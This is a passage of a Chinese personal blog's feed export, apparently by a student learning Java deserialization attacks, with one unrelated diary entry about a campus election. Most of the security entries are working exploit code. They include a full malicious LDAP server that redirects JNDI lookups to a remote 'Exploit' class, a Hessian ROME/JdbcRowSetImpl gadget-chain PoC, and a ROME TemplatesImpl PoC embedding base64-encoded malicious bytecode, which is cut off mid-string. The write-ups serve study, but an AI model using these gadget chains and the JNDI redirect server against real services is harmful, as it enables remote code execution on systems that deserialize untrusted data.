class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDKUtil#makeMap</title>
    <link href="/2022/03/30/JDKUtil-makeMap/"/>
    <url>/2022/03/30/JDKUtil-makeMap/</url>
    
    <content type="html"><![CDATA[<h1 id="JDKUtil-makeMap"><a href="#JDKUtil-makeMap" class="headerlink" title="JDKUtil#makeMap"></a>JDKUtil#makeMap</h1><p>marshalsec包里的这个东西到底干了什么？<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301639474.png" alt="QQ截图20220330161743"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; s = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>(); <span class="hljs-comment">//创建hashmap对象</span><br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reflections</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301639699.png" alt="QQ截图20220330161937"></p><p>通过反射将HashMap长度设置为2。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var6) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>获取了获取<code>java.util.HashMap$Node</code>或者<code>java.util.HashMap$Entry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);<br>      nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>实例化一个对象并且设置长度为2，并且第一个数据插入值为<code>java.util.HashMap$Node</code>或<code>java.util.HashMap$Entry</code>的实例化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br></code></pre></td></tr></table></figure><p>该对象在实例化的时候传递4个值，第一个值为0，第二和三个值为刚刚获取并传递进来的实例化对象，第四个为null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reflections.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br></code></pre></td></tr></table></figure><p>反射修改值。</p><h2 id="明白之前的困惑"><a href="#明白之前的困惑" class="headerlink" title="明白之前的困惑"></a>明白之前的困惑</h2><p>这么一来就懂了，这里如果们直接传入**hashMap(root,root)**，会直接调用<code>hashMap#hash</code>,并且这里我们已经传入了参数，就会直接调用    <code>EqualsBean#beanHashCode</code>，所以这样我们就直接形成了调用链。</p><p>但是这里通过了反射赋值，开始为空，在调用之后赋值，就明白了。</p>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessian（ROME+JDBC）</title>
    <link href="/2022/03/30/Hessian%EF%BC%88ROME-JDBC%EF%BC%89/"/>
    <url>/2022/03/30/Hessian%EF%BC%88ROME-JDBC%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessian-ROME-JDBC"><a href="#Hessian-ROME-JDBC" class="headerlink" title="Hessian(ROME+JDBC)"></a>Hessian(ROME+JDBC)</h1><p>这个就很简单，一样原理。</p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">hessianInput.readObject();<br>HashMap.hash<br>HashMap.putVal<br>HashMap.put<br>EqualsBean.beanHashCode<br>EqualsBean.hashCode<br><br>ToStringBean.toString<br>EqualsBean.beanHashCode<br>        <br>ToStringBean.toString()<br>        JdbcRowSetImpl.getDatabaseMetaData<br>JdbcRowSetImpl.connect<br>Context.lookup<br><br></code></pre></td></tr></table></figure><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>marshalsec的包</li><li>ldap环境（fastjson的jdbc有）</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:80/#Exploit&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> marshalsec.gadgets.JDKUtil;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianRomeJdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xs&quot;</span>;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        rs.setDataSourceName(jndiUrl);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, rs);<br><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, item);<br><br>        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br>        hessianOutput.writeObject(map);<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们知道<code>ToStringBean.toString()</code>会调用传入的类的getter方法，自然就会调用到<code>JdbcRowSetImpl.getDatabaseMetaData</code>，<br>看一下这个方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301608372.png" alt="QQ截图20220330155125"></p><p>跟进看一下connect方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301608533.png" alt="QQ截图20220330155207"></p><p>可以注意到这里进入<code>lookup()</code>，并且参数可以控制。</p><p>其他地方跟着调用链就很好理解。<br>唯独这个<strong>HashMap&lt;Object, Object&gt; map &#x3D; JDKUtil.makeMap(root, root);</strong></p><p>这里的makMap，上一篇其实了解到，这里不能用普通的map代替，所以它到底干了什么？单独弄一篇学习一下。</p>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一次竞选</title>
    <link href="/2022/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AB%9E%E9%80%89/"/>
    <url>/2022/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AB%9E%E9%80%89/</url>
    
    <content type="html"><![CDATA[<p>-昨天没有上传成功。</p><p>想了想还是记录一下。以前感觉上课上去讲ppt，都很无所谓的感觉（感觉就是平时没有积极对待，导致正经事的时候就水了~~）。今天上去竞选十佳青年的时候，7-8个辅导员都在，真的好紧张。上去讲的时候其实也还好（个人感觉）。讲完之后，文老师就跟我说：“张栩啊，你这ppt做的还挺好，怎么讲的这个样子啊，还害羞啊？不要紧张啊，多练习，准备一下稿子嘛。”真不知道之后还要在全校面前讲的时候会怎么样。希望是清明节之后在弄这些事情，到时候还可以跟我的猪儿演练一下。不过今天才发现，学校真的很多低调的大佬，欣赏他们能够处之泰然的感觉。嘿嘿附上我演讲的时候的照片。昨天这篇文章没有传上去，今天很无奈，被老师给我替换了。就是烦燥自己写了那么多的材料和做了ppt，被莫名其妙替换了。老师给出的解释让我不能理解，因为我感觉我比某些人的成绩要好。ok洗澡去了。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203292323199.jpg" alt="Screenshot_20220329_232326_com.tencent.mobileqq"><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282242164.jpg" alt="Cache_3720d6c433f9baef."></p>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessian之ROME链</title>
    <link href="/2022/03/28/Hessian%E4%B9%8BROME%E9%93%BE/"/>
    <url>/2022/03/28/Hessian%E4%B9%8BROME%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessian之ROME链"><a href="#Hessian之ROME链" class="headerlink" title="Hessian之ROME链"></a>Hessian之ROME链</h1><p>先来瞧瞧rome的利用链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>    ObjectBean.hashCode()<br>            EqualsBean.beanHashCode()<br>                ObjectBean.toString()<br>                    ToStringBean.toString()<br>                     TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>其实感觉这样一来比ROME会简单许多，因为不用构造装饰+构造hashmap了。就是考虑如下代码如何加入反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span 